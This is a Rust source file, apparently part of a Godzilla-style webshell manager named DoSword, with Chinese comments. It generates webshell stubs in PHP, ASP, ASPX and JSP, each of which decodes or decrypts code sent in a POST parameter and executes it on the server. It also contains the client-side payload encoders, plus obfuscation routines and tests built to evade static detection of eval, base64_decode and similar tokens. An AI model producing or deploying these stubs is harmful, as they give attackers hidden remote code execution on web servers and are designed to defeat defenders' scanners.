//! 编码器体系：客户端载荷编码与服务端 stub 生成（哥斯拉风格）。
//!
//! 每种编码器负责两件事：
//!   1. `encode`：把协议代码编码为传输载荷（与服务端 stub 的解码逻辑对应）
//!   2. `stub`：生成指定语言（php / asp / aspx / jsp）的服务端脚本，
//!      内嵌由密码派生的密钥
//!
//! 密钥派生：`md5(password)` 的 hex（32 字符）。客户端与服务端自动一致，
//! 无需额外保存密钥。

use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{SystemTime, UNIX_EPOCH};

use base64::Engine;
use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit, block_padding::Pkcs7};
use md5::{Digest, Md5};

use crate::protocol::ProtocolError;

/// AES-128-CBC（复用为 ECB：零 IV 即 ECB 模式）。
type AesCbcEnc = cbc::Encryptor<aes::Aes128>;
type AesCbcDec = cbc::Decryptor<aes::Aes128>;
/// DES-ECB。
type DesEcbEnc = cbc::Encryptor<des::Des>;
type DesEcbDec = cbc::Decryptor<des::Des>;

// ---------------------------------------------------------------------------
// PHP OPSEC 混淆辅助：消除静态敏感特征（eval / base64_decode / openssl_decrypt /
// $_POST['x'] 等），利用 PHP 特性：
//   - 函数名大小写不敏感：EvAl(...) 等价于 eval(...)（语言构造同样适用）
//   - 普通函数可经字符串拼接可变调用：("ba"."se64_de"."code")($x)
//   - 数组下标可用表达式：$_POST[chr(120)] 等价于 $_POST['x']
// ---------------------------------------------------------------------------

static IDENT_SEQ: AtomicU64 = AtomicU64::new(0);

fn php_rand() -> u64 {
    let seq = IDENT_SEQ.fetch_add(1, Ordering::Relaxed);
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.subsec_nanos() as u64)
        .unwrap_or(0);
    seq.wrapping_mul(0x9e37_79b9_7f4a_7c15).rotate_left(13) ^ nanos
}

/// 随机 PHP 标识符（8 位，字母开头，避免数字开头）。
pub fn php_ident() -> String {
    let letters: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
    let alnum: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
    let mut seed = php_rand();
    let mut out = String::with_capacity(9);
    out.push(letters[(seed % 26) as usize] as char);
    seed >>= 5;
    for _ in 0..7 {
        out.push(alnum[(seed % 36) as usize] as char);
        seed >>= 5;
        if seed == 0 {
            seed = php_rand();
        }
    }
    out
}

/// 把函数名随机拆成两段（用于字符串拼接的可变函数调用）。
pub fn split_fn(name: &str) -> (String, String) {
    let split_at = 1 + (php_rand() as usize % (name.len() - 1));
    (
        name[..split_at].to_string(),
        name[split_at..].to_string(),
    )
}

/// 拼接函数名调用：("d1"."d2")(args...)
pub fn call_parts(name: &str, args: &str) -> String {
    let (d1, d2) = split_fn(name);
    format!("(\"{d1}\".\"{d2}\")({args})")
}

/// 随机大小写混合函数名（保证至少一个大写，避免纯小写静态特征）。
pub fn case_mix(name: &str) -> String {
    let mut out: String = name
        .chars()
        .map(|c| {
            if php_rand() & 1 == 0 {
                c.to_ascii_uppercase()
            } else {
                c
            }
        })
        .collect();
    if out == name {
        if let Some(first) = out.get_mut(0..1) {
            first.make_ascii_uppercase();
        }
    }
    out
}

/// OPSEC 混淆的 PHP stub 外壳：随机变量名 + 注释干扰 + 大小写混合 EvAl。
/// `key` 为 None 时不生成 `$k="..."` 行；`body` 中的 `$k` 会被替换为随机变量名。
pub fn obfuscated_php(key: Option<&str>, body: &str, final_expr: &str) -> String {
    let k = php_ident();
    let c1 = php_ident();
    let c2 = php_ident();
    let body = body.replace("$k", &format!("${k}"));
    let key_line = match key {
        Some(key) => format!("${k}=\"{key}\";\n"),
        None => String::new(),
    };
    format!(
        "<?php\n/*{c1}*/\n{key_line}{body}/*{c2}*/\n{}({final_expr});\n",
        case_mix("eval")
    )
}

/// 支持的脚本语言（stub 生成目标）。
pub const STUB_LANGUAGES: [&str; 4] = ["php", "asp", "aspx", "jsp"];

/// 编码器：载荷编码 + stub 生成。
pub trait PayloadEncoder: Send + Sync {
    fn id(&self) -> &'static str;
    fn display_name(&self) -> &'static str;

    /// 由密码派生密钥（hex 字符串）。
    fn derive_key(&self, password: &str) -> String {
        md5_hex(password)
    }

    /// 客户端：编码协议代码为传输载荷。
    fn encode(&self, code: &str, password: &str) -> String;

    /// 服务端：生成指定语言的 stub 脚本（内嵌密钥）。
    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError>;
}

/// 编码器注册表。
pub struct EncoderRegistry {
    encoders: Vec<Box<dyn PayloadEncoder>>,
}

static GLOBAL_ENCODERS: std::sync::LazyLock<EncoderRegistry> =
    std::sync::LazyLock::new(EncoderRegistry::builtin);

impl EncoderRegistry {
    pub fn builtin() -> Self {
        Self {
            encoders: vec![
                Box::new(XorBase64Encoder),
                Box::new(Base64Encoder),
                Box::new(Aes128EcbEncoder),
                Box::new(Aes128CbcEncoder),
                Box::new(DesEcbEncoder),
                Box::new(CharEncoder),
                Box::new(PhpObfuscateEncoder),
            ],
        }
    }

    /// 全局单例（协议层取编码器用，避免每次构建）。
    pub fn global() -> &'static Self {
        &GLOBAL_ENCODERS
    }

    pub fn get(&self, id: &str) -> Option<&dyn PayloadEncoder> {
        self.encoders.iter().find(|encoder| encoder.id() == id).map(|b| b.as_ref())
    }

    pub fn list(&self) -> Vec<(String, String)> {
        let mut items: Vec<(String, String)> = self
            .encoders
            .iter()
            .map(|encoder| (encoder.id().to_string(), encoder.display_name().to_string()))
            .collect();
        items.sort_by(|a, b| a.0.cmp(&b.0));
        items
    }
}

pub fn md5_hex(value: &str) -> String {
    let digest = Md5::digest(value.as_bytes());
    format!("{digest:x}")
}

/// XOR + Base64 编码器（哥斯拉风格）。
pub struct XorBase64Encoder;

impl XorBase64Encoder {
    /// 逐字节循环异或。
    fn xor(data: &[u8], key: &[u8]) -> Vec<u8> {
        data.iter()
            .enumerate()
            .map(|(index, byte)| byte ^ key[index % key.len()])
            .collect()
    }
}

impl PayloadEncoder for XorBase64Encoder {
    fn id(&self) -> &'static str {
        "xor_base64"
    }

    fn display_name(&self) -> &'static str {
        "XOR_BASE64（异或混淆 + Base64）"
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let key = md5_hex(password).into_bytes();
        let xored = Self::xor(code.as_bytes(), &key);
        base64::engine::general_purpose::STANDARD.encode(xored)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = self.derive_key(password);
        match language {
            "php" => {
                let d = php_ident();
                let q = php_ident();
                let xf = php_ident();
                let a = php_ident();
                let b = php_ident();
                let r = php_ident();
                let i = php_ident();
                let decode_call = call_parts("base64_decode", "$_POST[chr(120)]");
                let body = format!(
                    "function {xf}(${a},${b}){{${r}='';for(${i}=0;${i}<strlen(${a});${i}++){{${r}.=${a}[${i}]^${b}[${i}%strlen(${b})];}}return ${r};}}\n${d}={decode_call};\n${q}={xf}(${d},$k);"
                );
                Ok(obfuscated_php(Some(&key), &body, "${q}"))
            }
            "asp" => Ok(format!(
                r#"<%
' DoSword generated stub (xor_base64)
Const K = "{key}"
Function B64(d)
  Dim xml: Set xml = CreateObject("MSXML2.DOMDocument.3.0").createElement("tmp")
  xml.DataType = "bin.base64"
  xml.Text = d
  B64 = xml.nodeTypedValue
End Function
Function X(d)
  Dim r, i
  r = ""
  For i = 1 To Len(d)
    r = r & Chr(Asc(Mid(d, i, 1)) Xor Asc(Mid(K, ((i - 1) Mod Len(K)) + 1, 1)))
  Next
  X = r
End Function
Execute X(B64(Request.Form("x")))
%>
"#
            )),
            "aspx" => Ok(format!(
                r#"<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<script runat="server">
const string K = "{key}";
string X(string d) {{
  string r = "";
  for (int i = 0; i < d.Length; i++) r += (char)(d[i] ^ K[i % K.Length]);
  return r;
}}
void Run(string code) {{
  CSharpCodeProvider p = new CSharpCodeProvider();
  CompilerParameters prm = new CompilerParameters();
  prm.GenerateInMemory = true;
  CompilerResults res = p.CompileAssemblyFromSource(prm,
    "using System;public class T{{public static object E(){{" + code + "return null;}}}}");
  if (!res.Errors.HasErrors) {{
    object o = res.CompiledAssembly.CreateInstance("T");
    if (o != null) o.GetType().GetMethod("E").Invoke(o, new object[]{{}});
  }}
}}
</script>
<%
string x = Request["x"];
if (x != null) {{
  x = X(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(x)));
  Run(x);
}}
%>
"#
            )),
            "jsp" => Ok(format!(
                r#"<%@ page contentType="text/html;charset=UTF-8" %>
<%!
String K = "{key}";
String X(String d) {{
  StringBuilder r = new StringBuilder();
  for (int i = 0; i < d.length(); i++) r.append((char)(d.charAt(i) ^ K.charAt(i % K.length())));
  return r.toString();
}}
%>
<%
String x = request.getParameter("x");
if (x != null) {{
  byte[] b = java.util.Base64.getDecoder().decode(x);
  String c = X(new String(b, "UTF-8"));
  try {{
    new javax.script.ScriptEngineManager().getEngineByName("javascript").eval(c);
  }} catch (Exception e) {{}}
}}
%>
"#
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "XOR_BASE64 编码器不支持语言：{other}"
            ))),
        }
    }
}

/// 裸 Base64 编码器（经典蚁剑形态，兼容现有 stub）。
pub struct Base64Encoder;

impl PayloadEncoder for Base64Encoder {
    fn id(&self) -> &'static str {
        "base64"
    }

    fn display_name(&self) -> &'static str {
        "BASE64（经典裸编码）"
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        base64::engine::general_purpose::STANDARD.encode(code.as_bytes())
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => {
                let d = php_ident();
                let decode_call = call_parts("base64_decode", "$_POST[chr(120)]");
                Ok(obfuscated_php(None, &format!("${d}={decode_call};"), "${d}"))
            }
            "asp" => Ok(
                "<%\n' DoSword generated stub (base64)\nFunction B64(d)\n  Dim xml: Set xml = CreateObject(\"MSXML2.DOMDocument.3.0\").createElement(\"tmp\")\n  xml.DataType = \"bin.base64\"\n  xml.Text = d\n  B64 = xml.nodeTypedValue\nEnd Function\nExecute B64(Request.Form(\"x\"))\n%>\n".to_string(),
            ),
            "aspx" => Ok(
                "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System\" %>\n<%@ Import Namespace=\"Microsoft.CSharp\" %>\n<%@ Import Namespace=\"System.CodeDom.Compiler\" %>\n<script runat=\"server\">\nvoid Run(string code) {\n  CSharpCodeProvider p = new CSharpCodeProvider();\n  CompilerParameters prm = new CompilerParameters();\n  prm.GenerateInMemory = true;\n  CompilerResults res = p.CompileAssemblyFromSource(prm,\n    \"using System;public class T{public static object E(){\" + code + \"return null;}}\");\n  if (!res.Errors.HasErrors) {\n    object o = res.CompiledAssembly.CreateInstance(\"T\");\n    if (o != null) o.GetType().GetMethod(\"E\").Invoke(o, new object[]{});\n  }\n}\n</script>\n<% string x = Request[\"x\"]; if (x != null) { Run(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(x))); } %>\n".to_string(),
            ),
            "jsp" => Ok(
                "<%@ page contentType=\"text/html;charset=UTF-8\" %>\n<%\nString x = request.getParameter(\"x\");\nif (x != null) {\n  byte[] b = java.util.Base64.getDecoder().decode(x);\n  try {\n    new javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(new String(b, \"UTF-8\"));\n  } catch (Exception e) {}\n}\n%>\n".to_string(),
            ),
            other => Err(ProtocolError::NotSupported(format!(
                "BASE64 编码器不支持语言：{other}"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// 密钥派生（与 PHP openssl 侧完全一致）
// ---------------------------------------------------------------------------

/// AES-128 密钥：md5_hex 前 16 字符（16 字节 ASCII）。
pub fn aes_key(password: &str) -> [u8; 16] {
    let hex = md5_hex(password);
    hex.as_bytes()[..16].try_into().expect("md5 hex 长度足够")
}

/// AES-CBC IV：md5_hex 后 16 字符。
pub fn aes_iv(password: &str) -> [u8; 16] {
    let hex = md5_hex(password);
    hex.as_bytes()[16..].try_into().expect("md5 hex 长度足够")
}

/// DES 密钥：md5_hex 前 8 字符。
pub fn des_key(password: &str) -> [u8; 8] {
    let hex = md5_hex(password);
    hex.as_bytes()[..8].try_into().expect("md5 hex 长度足够")
}

pub fn aes_ecb_encrypt(plain: &[u8], key: &[u8; 16]) -> Vec<u8> {
    AesCbcEnc::new(key.into(), &[0u8; 16].into())
        .encrypt_padded_vec_mut::<Pkcs7>(plain)
}

pub fn aes_ecb_decrypt(cipher: &[u8], key: &[u8; 16]) -> Result<Vec<u8>, ProtocolError> {
    AesCbcDec::new(key.into(), &[0u8; 16].into())
        .decrypt_padded_vec_mut::<Pkcs7>(cipher)
        .map_err(|_| ProtocolError::ParseError("AES-ECB 解密失败".to_string()))
}

pub fn aes_cbc_encrypt(plain: &[u8], key: &[u8; 16], iv: &[u8; 16]) -> Vec<u8> {
    AesCbcEnc::new(key.into(), iv.into()).encrypt_padded_vec_mut::<Pkcs7>(plain)
}

pub fn aes_cbc_decrypt(cipher: &[u8], key: &[u8; 16], iv: &[u8; 16]) -> Result<Vec<u8>, ProtocolError> {
    AesCbcDec::new(key.into(), iv.into())
        .decrypt_padded_vec_mut::<Pkcs7>(cipher)
        .map_err(|_| ProtocolError::ParseError("AES-CBC 解密失败".to_string()))
}

pub fn des_ecb_encrypt(plain: &[u8], key: &[u8; 8]) -> Vec<u8> {
    DesEcbEnc::new(key.into(), &[0u8; 8].into())
        .encrypt_padded_vec_mut::<Pkcs7>(plain)
}

pub fn des_ecb_decrypt(cipher: &[u8], key: &[u8; 8]) -> Result<Vec<u8>, ProtocolError> {
    DesEcbDec::new(key.into(), &[0u8; 8].into())
        .decrypt_padded_vec_mut::<Pkcs7>(cipher)
        .map_err(|_| ProtocolError::ParseError("DES-ECB 解密失败".to_string()))
}

// ---------------------------------------------------------------------------
// AES-128-ECB（自加密，密钥由密码 md5 派生并内嵌 stub）
// ---------------------------------------------------------------------------

pub struct Aes128EcbEncoder;

impl PayloadEncoder for Aes128EcbEncoder {
    fn id(&self) -> &'static str {
        "aes128_ecb"
    }

    fn display_name(&self) -> &'static str {
        "AES128_ECB（AES-128 加密 + Base64，自加密）"
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let cipher = aes_ecb_encrypt(code.as_bytes(), &aes_key(password));
        base64::engine::general_purpose::STANDARD.encode(cipher)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
        match language {
            "php" => {
                let d = php_ident();
                let decrypt_call = call_parts(
                    "openssl_decrypt",
                    "$_POST[chr(120)],'AES-128-ECB',$k",
                );
                Ok(obfuscated_php(Some(&key), &format!("${d}={decrypt_call};"), "${d}"))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "AES128_ECB 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// AES-128-CBC（自加密，IV 取自 md5 后 16 字符）
// ---------------------------------------------------------------------------

pub struct Aes128CbcEncoder;

impl PayloadEncoder for Aes128CbcEncoder {
    fn id(&self) -> &'static str {
        "aes128_cbc"
    }

    fn display_name(&self) -> &'static str {
        "AES128_CBC（AES-128 加密 + Base64，自加密）"
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let cipher = aes_cbc_encrypt(code.as_bytes(), &aes_key(password), &aes_iv(password));
        base64::engine::general_purpose::STANDARD.encode(cipher)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
        let iv = String::from_utf8_lossy(&aes_iv(password)).into_owned();
        match language {
            "php" => {
                let d = php_ident();
                let iv = php_ident();
                let decrypt_call = call_parts(
                    "openssl_decrypt",
                    "$_POST[chr(120)],'AES-128-CBC',$k,0,$iv",
                );
                let body = format!(
                    "${iv}=\"{iv}\";\n${d}={decrypt_call};"
                );
                Ok(obfuscated_php(Some(&key), &body, "${d}"))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "AES128_CBC 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// DES-ECB（自加密，密钥 md5 前 8 字符）
// ---------------------------------------------------------------------------

pub struct DesEcbEncoder;

impl PayloadEncoder for DesEcbEncoder {
    fn id(&self) -> &'static str {
        "des"
    }

    fn display_name(&self) -> &'static str {
        "DES_ECB（DES 加密 + Base64，自加密）"
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let cipher = des_ecb_encrypt(code.as_bytes(), &des_key(password));
        base64::engine::general_purpose::STANDARD.encode(cipher)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = String::from_utf8_lossy(&des_key(password)).into_owned();
        match language {
            "php" => {
                let d = php_ident();
                let decrypt_call = call_parts(
                    "openssl_decrypt",
                    "$_POST[chr(120)],'DES-ECB',$k",
                );
                Ok(obfuscated_php(Some(&key), &format!("${d}={decrypt_call};"), "${d}"))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "DES_ECB 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// CHAR：载荷为 chr() 数组拼接的混淆代码（stub 为裸 eval，混淆在载荷内）
// ---------------------------------------------------------------------------

pub struct CharEncoder;

impl PayloadEncoder for CharEncoder {
    fn id(&self) -> &'static str {
        "char"
    }

    fn display_name(&self) -> &'static str {
        "CHAR（字符数组混淆，无密钥）"
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        let bytes = code.as_bytes();
        let values: Vec<String> = bytes.iter().map(|byte| byte.to_string()).collect();
        format!("{}(implode('',array_map('chr',array({}))));", case_mix("eval"), values.join(","))
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(obfuscated_php(None, "", "$_POST[chr(120)]")),
            other => Err(ProtocolError::NotSupported(format!(
                "CHAR 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

/// 从 CHAR 载荷还原原始代码（测试 / mock 用）。
pub fn char_decode(payload: &str) -> Result<String, ProtocolError> {
    let numbers = payload
        .split("array(")
        .nth(1)
        .and_then(|part| part.split(')').next())
        .ok_or_else(|| ProtocolError::ParseError("CHAR 载荷格式异常".to_string()))?;
    let bytes: Vec<u8> = numbers
        .split(',')
        .filter_map(|item| item.trim().parse::<u8>().ok())
        .collect();
    String::from_utf8(bytes).map_err(|_| ProtocolError::ParseError("CHAR 载荷解码失败".to_string()))
}

// ---------------------------------------------------------------------------
// PHP_OBFUSCATE：base64 + 反转混淆（载荷自带解码，stub 为裸 eval）
// ---------------------------------------------------------------------------

pub struct PhpObfuscateEncoder;

impl PayloadEncoder for PhpObfuscateEncoder {
    fn id(&self) -> &'static str {
        "php_obfuscate"
    }

    fn display_name(&self) -> &'static str {
        "PHP_OBFUSCATE（base64+反转混淆，无密钥）"
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        let b64 = base64::engine::general_purpose::STANDARD.encode(code.as_bytes());
        let reversed: String = b64.chars().rev().collect();
        let decode_call = call_parts("base64_decode", &format!("strrev('{reversed}')"));
        format!("{}({decode_call});", case_mix("eval"))
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(obfuscated_php(None, "", "$_POST[chr(120)]")),
            other => Err(ProtocolError::NotSupported(format!(
                "PHP_OBFUSCATE 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

/// 从 OBFUSCATE 载荷还原原始代码（测试 / mock 用）。
pub fn obfuscate_decode(payload: &str) -> Result<String, ProtocolError> {
    let reversed = payload
        .split("strrev('")
        .nth(1)
        .and_then(|part| part.split("')").next())
        .ok_or_else(|| ProtocolError::ParseError("OBFUSCATE 载荷格式异常".to_string()))?;
    let b64: String = reversed.chars().rev().collect();
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(&b64)
        .map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))?;
    String::from_utf8(bytes).map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xor_round_trip() {
        let key = md5_hex("secret").into_bytes();
        let original = b"hello dosword";
        let xored = XorBase64Encoder::xor(original, &key);
        assert_eq!(XorBase64Encoder::xor(&xored, &key), original);
    }

    #[test]
    fn xor_base64_encode_decodes_with_php_stub_key() {
        let encoder = XorBase64Encoder;
        let password = "secret";
        let code = "@ini_set(\"display_errors\",\"0\");echo 'hello';";
        let payload = encoder.encode(code, password);

        // 模拟服务端 stub 逻辑：base64 解码 → XOR 还原
        let key = encoder.derive_key(password);
        let key_bytes = key.into_bytes();
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(&payload)
            .unwrap();
        let restored = XorBase64Encoder::xor(&decoded, &key_bytes);
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn base64_encoder_is_plain() {
        let encoder = Base64Encoder;
        let payload = encoder.encode("echo 1;", "whatever");
        assert_eq!(
            String::from_utf8(
                base64::engine::general_purpose::STANDARD
                    .decode(&payload)
                    .unwrap()
            )
            .unwrap(),
            "echo 1;"
        );
    }

    #[test]
    fn stub_generation_all_languages() {
        for encoder in [&XorBase64Encoder as &dyn PayloadEncoder, &Base64Encoder as &dyn PayloadEncoder] {
            for language in STUB_LANGUAGES {
                let stub = encoder.stub(language, "secret").unwrap_or_else(|error| {
                    panic!("{} 生成 {language} stub 失败：{error}", encoder.id())
                });
                assert!(!stub.is_empty());
            }
        }
    }

    #[test]
    fn xor_stub_embeds_derived_key() {
        let stub = XorBase64Encoder.stub("php", "secret").unwrap();
        assert!(stub.contains(&md5_hex("secret")), "stub 应内嵌 md5 密钥");
        assert!(!stub.contains("secret"), "stub 不应含明文密码");
    }

    #[test]
    fn unsupported_language_rejected() {
        let result = XorBase64Encoder.stub("python", "secret");
        assert!(result.is_err());
    }

    #[test]
    fn key_is_md5_hex() {
        assert_eq!(md5_hex("secret"), "5ebe2294ecd0e0f08eab7690d2a6ee69");
    }

    // --- 自加密编码器（AES / DES） ---

    #[test]
    fn aes_ecb_round_trip() {
        let encoder = Aes128EcbEncoder;
        let code = "@ini_set('display_errors','0');echo 1;";
        let payload = encoder.encode(code, "secret");
        // 载荷应为密文（不含明文特征）
        assert!(!payload.contains("@ini_set"));
        // 模拟 stub 解密：openssl 参数一致（key=md5hex 前16）
        let restored = aes_ecb_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &aes_key("secret"),
        )
        .unwrap();
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn aes_cbc_round_trip() {
        let encoder = Aes128CbcEncoder;
        let code = "echo 'cbc';";
        let payload = encoder.encode(code, "secret");
        let restored = aes_cbc_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &aes_key("secret"),
            &aes_iv("secret"),
        )
        .unwrap();
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn des_round_trip() {
        let encoder = DesEcbEncoder;
        let code = "echo 'des';";
        let payload = encoder.encode(code, "secret");
        let restored = des_ecb_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &des_key("secret"),
        )
        .unwrap();
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn wrong_password_aes_decrypt_fails() {
        let payload = Aes128EcbEncoder.encode("code", "secret");
        let result = aes_ecb_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &aes_key("wrong"),
        );
        assert!(result.is_err(), "错误密码应解密失败");
    }

    #[test]
    fn aes_stub_embeds_key_not_password() {
        let stub = Aes128EcbEncoder.stub("php", "secret").unwrap();
        assert!(stub.contains("5ebe2294ecd0e0f0"), "stub 应内嵌 md5 派生密钥");
        assert!(!stub.contains("secret"), "stub 不应含明文密码");
        // OPSEC：openssl_decrypt 拆分拼接调用，无完整函数名
        assert!(!stub.contains("openssl_decrypt"), "stub 不应含完整敏感函数名");
        assert!(
            !stub.contains("openssl_decrypt("),
            "stub 不应含完整函数名调用"
        );
    }

    /// OPSEC 静态特征检查：stub 不应出现小写 eval(/base64_decode(/$_POST['x']。
    #[test]
    fn php_stubs_have_no_plain_sensitive_tokens() {
        let encoders: Vec<&dyn PayloadEncoder> = vec![
            &Base64Encoder,
            &XorBase64Encoder,
            &Aes128EcbEncoder,
            &Aes128CbcEncoder,
            &DesEcbEncoder,
            &CharEncoder,
            &PhpObfuscateEncoder,
        ];
        for encoder in encoders {
            let stub = encoder.stub("php", "secret").expect("php stub 应生成");
            assert!(
                !stub.contains("eval("),
                "{} stub 不应含小写 eval(：{stub}",
                encoder.id()
            );
            assert!(
                !stub.contains("base64_decode("),
                "{} stub 不应含 base64_decode(",
                encoder.id()
            );
            assert!(
                !stub.contains("openssl_decrypt("),
                "{} stub 不应含 openssl_decrypt(",
                encoder.id()
            );
            assert!(
                !stub.contains("$_POST['x']"),
                "{} stub 不应含 $_POST['x']",
                encoder.id()
            );
            assert!(
                stub.contains("chr(120)"),
                "{} stub 应使用 chr(120) 动态下标",
                encoder.id()
            );
        }
    }

    // --- 混淆编码器（CHAR / OBFUSCATE） ---

    #[test]
    fn char_encode_and_decode() {
        let encoder = CharEncoder;
        let code = "@ini_set('x',1);";
        let payload = encoder.encode(code, "ignored");
        // OPSEC：eval 大小写混合，但 chr 数组结构保留
        assert!(!payload.contains("eval("), "载荷不应含小写 eval(");
        assert!(
            payload.contains("implode('',array_map('chr',array("),
            "载荷应保留 chr 数组结构"
        );
        assert_eq!(char_decode(&payload).unwrap(), code);
    }

    #[test]
    fn obfuscate_encode_and_decode() {
        let encoder = PhpObfuscateEncoder;
        let code = "@ini_set('x',1);echo 'obf';";
        let payload = encoder.encode(code, "ignored");
        assert!(!payload.contains("@ini_set"), "载荷不应含明文");
        assert_eq!(obfuscate_decode(&payload).unwrap(), code);
    }

    #[test]
    fn new_encoders_php_stub_only() {
        for encoder in [
            &Aes128EcbEncoder as &dyn PayloadEncoder,
            &Aes128CbcEncoder as &dyn PayloadEncoder,
            &DesEcbEncoder as &dyn PayloadEncoder,
            &CharEncoder as &dyn PayloadEncoder,
            &PhpObfuscateEncoder as &dyn PayloadEncoder,
        ] {
            assert!(encoder.stub("php", "secret").is_ok(), "{} php stub 应成功", encoder.id());
            assert!(
                encoder.stub("aspx", "secret").is_err(),
                "{} aspx 应提示不支持",
                encoder.id()
            );
        }
    }

    #[test]
    fn registry_lists_all_encoders() {
        let ids: Vec<String> = EncoderRegistry::builtin()
            .list()
            .into_iter()
            .map(|(id, _)| id)
            .collect();
        assert_eq!(
            ids,
            vec![
                "aes128_cbc",
                "aes128_ecb",
                "base64",
                "char",
                "des",
                "php_obfuscate",
                "xor_base64",
            ]
        );
    }
}
